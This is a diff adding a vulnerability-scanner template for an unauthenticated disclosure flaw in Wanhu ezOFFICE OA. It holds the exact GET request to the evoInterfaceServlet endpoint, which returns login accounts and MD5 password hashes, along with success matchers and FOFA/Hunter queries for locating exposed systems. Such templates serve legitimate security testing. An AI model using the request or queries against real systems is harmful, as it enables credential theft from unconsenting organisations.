@@ -1,0 +1,26 @@
+id: wanhu-ezoffice-evointerfaceservlet-disclosure
+ 
+info:
+  name: 万户 ezoffice evointerfaceservlet - disclosure
+  author: wuha
+  severity: high
+  description: 万户ezoffice存在未授权访问漏洞，攻击者可以从evoInterfaceServlet接口获得系统登录账号和用MD5加密的密码
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,oa,disclosure,ezoffice
+ 
+http:
+  - raw:
+      - |
+        GET /defaultroot/evoInterfaceServlet?paramType=user HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'result:','success','data:')
+          - status_code == 200
+        condition: and
